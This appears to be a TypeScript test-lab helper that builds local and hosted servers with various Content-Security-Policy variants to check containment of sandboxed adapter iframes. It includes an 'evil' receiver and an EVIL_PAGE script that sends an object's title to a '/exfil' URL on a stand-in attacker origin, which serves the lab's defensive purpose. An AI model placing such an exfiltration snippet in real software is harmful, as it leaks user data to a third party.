import { mkdtempSync, readdirSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { sha256Bytes } from "../../../src/common/registry/arc-package-inventory";
import { writeDeskFixturePackage } from "../../../src/conversations/domain-adapters/__tests__/fixtures/package-fixtures";
import { handleDeskAdapterAssets } from "../../../src/surface/mc/api/desk-adapter-assets";
import type { MutationGuardContext } from "../../../src/surface/mc/api/mutation-guard";
import { CF_ACCESS_JWT_HEADER } from "../../../src/surface/mc/api/networks-admission";
import { DESK_ADAPTER_ASSET_PREFIX, parseAssetPath } from "../../../src/surface/mc/desk/adapter-assets";
import { ASSET_OWNER, openAssetRig, type AssetRig } from "../../../src/surface/mc/desk/__tests__/fixtures/adapter-asset-fixtures";

export type Variant = "open" | "merged" | "combined" | "inline";
export type Route = "local" | "hosted";
export const VARIANTS: readonly Variant[] = ["open", "merged", "combined", "inline"];
export const ROUTES: readonly Route[] = ["local", "hosted"];
export const SESSION_COOKIE = "CF_Authorization";
export const SESSION_VALUE = `lab-session-${ASSET_OWNER}`;

const HERE = import.meta.dir;
const MEDIA: Record<string, string> = { html: "text/html", js: "text/javascript", css: "text/css", png: "image/png", woff2: "font/woff2" };

export interface HostHit { at: number; path: string; method: string; status: number; origin: string | null; dest: string | null; cookie: boolean; note?: string }

export interface LabCell {
  route: Route;
  variant: Variant;
  origin: string;
  redirectPath: string;
  hits: HostHit[];
  stop(): Promise<void>;
}

export function combinedAssetPolicy(origin: string, pathname: string): string {
  const parsed = parseAssetPath(pathname);
  const scope = parsed ? `${origin}${DESK_ADAPTER_ASSET_PREFIX}${parsed.releaseDigest}/${encodeURIComponent(parsed.connectionId)}/` : "'none'";
  return [
    "default-src 'none'", `script-src ${scope}`, `style-src ${scope}`, `img-src ${scope}`, `font-src ${scope}`,
    ...LOCKDOWN, `frame-ancestors ${origin}`,
  ].join("; ");
}

export const combinedShellPolicy = (origin: string): string =>
  `default-src 'self'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self' 'unsafe-inline'; frame-src ${origin}${DESK_ADAPTER_ASSET_PREFIX}; object-src 'none'; base-uri 'none'; form-action 'none'`;

const LOCKDOWN = ["media-src 'none'", "connect-src 'none'", "worker-src 'none'", "child-src 'none'", "frame-src 'none'", "manifest-src 'none'", "object-src 'none'", "base-uri 'none'", "form-action 'none'", "sandbox allow-scripts"];
const b64sha = (text: string): string => `'sha256-${new Bun.CryptoHasher("sha256").update(text).digest("base64")}'`;

export async function inlineGeneration(rig: AssetRig, principal: string, request: { releaseDigest: string; connectionId: string; path: string }, origin: string): Promise<{ html: string; policy: string } | null> {
  const read = async (path: string): Promise<{ bytes: Uint8Array; mediaType: string } | null> => {
    const body = await rig.service.asset(principal, { ...request, path });
    return body.ok ? { bytes: body.bytes, mediaType: body.mediaType } : null;
  };
  const entry = await read(request.path);
  if (!entry || entry.mediaType !== "text/html") return null;
  const dataUri = async (path: string): Promise<string> => { const file = await read(path); return file ? `data:${file.mediaType};base64,${Buffer.from(file.bytes).toString("base64")}` : "data:,"; };
  const scripts: string[] = [];
  const styles: string[] = [];
  let html = new TextDecoder().decode(entry.bytes);
  for (const match of [...html.matchAll(/<img ([^>]*)src="([^"]+)"/g)]) { const uri = await dataUri(match[2] ?? ""); html = html.replace(match[0], () => `<img ${match[1]}src="${uri}"`); }
  for (const match of [...html.matchAll(/<link rel="stylesheet" href="([^"]+)">/g)]) {
    const file = await read(match[1] ?? "");
    let css = file ? new TextDecoder().decode(file.bytes) : "";
    for (const ref of [...css.matchAll(/url\("([^"]+)"\)/g)]) { const uri = await dataUri(ref[1] ?? ""); css = css.replace(ref[0], () => `url("${uri}")`); }
    styles.push(css);
    html = html.replace(match[0], () => `<style>${css}</style>`);
  }
  for (const match of [...html.matchAll(/<script src="([^"]+)"><\/script>/g)]) {
    const file = await read(match[1] ?? "");
    const js = file ? new TextDecoder().decode(file.bytes) : "";
    scripts.push(js);
    html = html.replace(match[0], () => `<script>${js}</script>`);
  }
  const policy = ["default-src 'none'", `script-src ${scripts.map(b64sha).join(" ")}`, `style-src ${styles.map(b64sha).join(" ")}`, "img-src data:", "font-src data:", ...LOCKDOWN, `frame-ancestors ${origin}`].join("; ");
  return { html, policy };
}

function rewriteAsset(response: Response, variant: Variant, origin: string, pathname: string): Response {
  if (variant === "merged" || variant === "inline") return response;
  const headers = new Headers(response.headers);
  if (variant === "open") {
    headers.delete("Content-Security-Policy");
    headers.delete("Cross-Origin-Resource-Policy");
  } else {
    headers.set("Content-Security-Policy", combinedAssetPolicy(origin, pathname));
    headers.set("Cross-Origin-Resource-Policy", "cross-origin");
  }
  return new Response(response.body, { status: response.status, headers });
}

export interface LabPackage { rig: AssetRig; releaseDigest: string }

export async function openLabPackage(): Promise<LabPackage> {
  const rig = await openAssetRig();
  const uiDir = join(HERE, "package-ui");
  const files = readdirSync(uiDir).sort().map(path => {
    const bytes = readFileSync(join(uiDir, path));
    writeFileSync(join(rig.packageDir, path), bytes);
    return { path, sha256: sha256Bytes(bytes), mediaType: MEDIA[path.split(".").pop() ?? ""] ?? "application/octet-stream" };
  });
  const { manifest } = writeDeskFixturePackage(rig.packageDir, { ui: true, packageVersion: "1.1.0" });
  const patched = { ...manifest, ui: { protocolVersion: "1.0.0", entry: "app.html", views: [{ objectType: "task", view: "result" }], files } };
  writeFileSync(join(rig.packageDir, "desk-adapter.json"), JSON.stringify(patched, null, 2));
  for (const file of files) writeFileSync(join(rig.packageDir, file.path), readFileSync(join(uiDir, file.path)));
  const activated = await rig.loader.activate(rig.packageId);
  if (!activated.ok) throw new Error(`lab package activation failed: ${activated.error.message}`);
  const catalog = await rig.service.catalog(ASSET_OWNER);
  if ("ok" in catalog) throw new Error(`lab catalog failed: ${catalog.message}`);
  const entry = catalog.adapters[0];
  if (!entry) throw new Error("lab catalog is empty");
  return { rig, releaseDigest: entry.releaseDigest };
}

export async function buildShell(): Promise<string> {
  const built = await Bun.build({ entrypoints: [join(HERE, "shell.ts")], target: "browser", minify: false });
  if (!built.success || !built.outputs[0]) throw new Error(`shell build failed: ${built.logs.map(String).join("\n")}`);
  return built.outputs[0].text();
}

const shellHtml = `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Desk frame lab</title></head><body><h1>Desk frame containment lab</h1><script src="/lab/shell.js"></script></body></html>`;

let tlsFiles: { cert: string; key: string } | null = null;
function labTls(): { cert: string; key: string } {
  if (tlsFiles) return tlsFiles;
  const dir = mkdtempSync(join(tmpdir(), "desk-frame-lab-tls-"));
  const made = Bun.spawnSync(["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes", "-days", "2", "-subj", "/CN=localhost", "-addext", "subjectAltName=DNS:localhost", "-keyout", join(dir, "key.pem"), "-out", join(dir, "cert.pem")], { stderr: "pipe" });
  if (made.exitCode !== 0) throw new Error(`openssl failed: ${made.stderr.toString()}`);
  tlsFiles = { cert: readFileSync(join(dir, "cert.pem"), "utf8"), key: readFileSync(join(dir, "key.pem"), "utf8") };
  return tlsFiles;
}

export function openCell(route: Route, variant: Variant, rig: AssetRig, shellJs: string, loginOrigin: string): LabCell {
  const hits: HostHit[] = [];
  const hostname = route === "local" ? "127.0.0.1" : "localhost";
  let origin = "";
  let port = 0;
  const access = () => rig.service;
  const localGuard = (): MutationGuardContext => ({ isLoopback: true, allowedHostnames: new Set(["127.0.0.1"]), listenPort: port, principals: new Set(), localPrincipal: ASSET_OWNER });
  const hostedGuard = (): MutationGuardContext => ({
    isLoopback: false, allowedHostnames: new Set(["localhost"]), listenPort: port, principals: new Set([ASSET_OWNER]), localPrincipal: ASSET_OWNER,
    verifyJwt: assertion => Promise.resolve(assertion.startsWith("verified:") ? { email: assertion.slice("verified:".length) } : null),
  });
  const redirectPath = route === "local" ? "/__lab/redirect" : "/cdn-cgi/access/logout";

  const server = Bun.serve({ hostname, port: 0, ...(route === "hosted" ? { tls: labTls() } : {}), async fetch(req) {
    const url = new URL(req.url);
    const cookie = (req.headers.get("cookie") ?? "").split(/;\s*/).includes(`${SESSION_COOKIE}=${SESSION_VALUE}`);
    const record = (status: number, note?: string): void => { hits.push({ at: Date.now(), path: url.pathname + url.search, method: req.method, status, origin: req.headers.get("origin"), dest: req.headers.get("sec-fetch-dest"), cookie, ...(note ? { note } : {}) }); };
    const done = (response: Response, note?: string): Response => { record(response.status, note); return response; };
    const to = url.searchParams.get("to") ?? "about:blank";

    if (url.pathname === redirectPath || url.pathname.includes("/__expired__/")) return done(Response.redirect(to, 302), "lab redirect");
    if (route === "hosted" && !cookie) return done(Response.redirect(`${loginOrigin}/access-login${url.pathname}`, 302), "gateway: unauthenticated");

    if (url.pathname === "/" || url.pathname === "/lab/shell.html") {
      const headers: Record<string, string> = { "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store" };
      if (variant === "combined" || variant === "inline") headers["Content-Security-Policy"] = combinedShellPolicy(origin);
      return done(new Response(shellHtml, { headers }));
    }
    if (url.pathname === "/lab/shell.js") return done(new Response(shellJs, { headers: { "Content-Type": "text/javascript; charset=utf-8", "Cache-Control": "no-store" } }));
    if (url.pathname.startsWith("/api/desk/adapters")) {
      const headers = new Headers(req.headers);
      headers.delete(CF_ACCESS_JWT_HEADER);
      if (route === "hosted") headers.set(CF_ACCESS_JWT_HEADER, `verified:${ASSET_OWNER}`);
      const forwarded = new Request(req.url, { method: req.method, headers });
      const parsed = parseAssetPath(url.pathname);
      if (variant === "inline" && parsed?.path.endsWith(".html")) {
        const gate = await handleDeskAdapterAssets(new Request(forwarded, { method: "HEAD" }), url, route === "local" ? localGuard() : hostedGuard(), access);
        if (gate.status !== 200) return done(gate, "inline gate refused");
        const doc = await inlineGeneration(rig, ASSET_OWNER, parsed, origin);
        if (!doc) return done(new Response("unavailable", { status: 404 }));
        return done(new Response(doc.html, { headers: { "Content-Type": "text/html; charset=utf-8", "Cache-Control": "private, no-cache", "X-Content-Type-Options": "nosniff", "Referrer-Policy": "no-referrer", "Content-Security-Policy": doc.policy } }), "inline document");
      }
      const response = await handleDeskAdapterAssets(forwarded, url, route === "local" ? localGuard() : hostedGuard(), access);
      return done(rewriteAsset(response, variant, origin, url.pathname));
    }
    return done(new Response("not found", { status: 404 }));
  } });
  port = server.port ?? 0;
  origin = `${route === "hosted" ? "https" : "http"}://${hostname}:${port}`;
  return { route, variant, origin, redirectPath, hits, stop: () => server.stop(true) };
}

export interface EvilEvent { at: number; kind: "connect" | "request" | "udp"; line?: string; bytes?: number }

export interface EvilReceiver { origin: string; udp: string; events: EvilEvent[]; stop(): void }

const EVIL_PAGE = (tag: string, evil: string): string => `<!doctype html><html><body>evil<script>
addEventListener("message", e => {
  if (!e.data || e.data.type !== "host:init" || !e.ports[0]) return;
  const port = e.ports[0]; const d = e.data;
  const id = { protocol: d.protocol, version: d.version, instance: d.instance, adapterId: d.adapterId, connectionId: d.connectionId, generationId: d.generationId, releaseDigest: d.releaseDigest };
  new Image().src = "${evil}/${tag}/evil-got-init";
  port.onmessage = m => { if (m.data && m.data.type === "host:projection") new Image().src = "${evil}/${tag}/exfil?c=" + encodeURIComponent(m.data.body.object.title); };
  port.start();
  port.postMessage({ ...id, seq: 1, type: "ui:ready", body: { mount: d.body.mount } });
});
</script></body></html>`;

export async function openEvil(secure = false): Promise<EvilReceiver> {
  const events: EvilEvent[] = [];
  let origin = "";
  const tcp = Bun.listen<{ buffer: string; answered: boolean }>({
    hostname: "127.0.0.1", port: 0, ...(secure ? { tls: labTls() } : {}),
    socket: {
      open(socket) { socket.data = { buffer: "", answered: false }; events.push({ at: Date.now(), kind: "connect" }); },
      data(socket, chunk) {
        socket.data.buffer += chunk.toString("latin1");
        const end = socket.data.buffer.indexOf("\r\n\r\n");
        if (end < 0 || socket.data.answered) return;
        socket.data.answered = true;
        const line = socket.data.buffer.split("\r\n")[0] ?? "";
        events.push({ at: Date.now(), kind: "request", line });
        const path = line.split(" ")[1] ?? "/";
        const tag = path.split("/")[1] ?? "";
        const isPage = path.includes("evil-page.html");
        const body = isPage ? EVIL_PAGE(tag, origin) : "ok";
        const type = isPage ? "text/html" : path.includes("/style") || path.includes("css-import") ? "text/css" : path.includes("/script") || path.includes("/import") || path.includes("worker") ? "text/javascript" : "text/plain";
        socket.write(`HTTP/1.1 200 OK\r\nContent-Type: ${type}\r\nContent-Length: ${Buffer.byteLength(body)}\r\nAccess-Control-Allow-Origin: *\r\nConnection: close\r\n\r\n${body}`);
        socket.end();
      },
      close() {},
      error() {},
    },
  });
  origin = `${secure ? "https" : "http"}://127.0.0.1:${tcp.port}`;
  const udp = await Bun.udpSocket({ hostname: "127.0.0.1", socket: { data(_socket, buf) { events.push({ at: Date.now(), kind: "udp", bytes: buf.length }); } } });
  return { origin, udp: `127.0.0.1:${udp.port}`, events, stop() { tcp.stop(true); udp.close(); } };
}
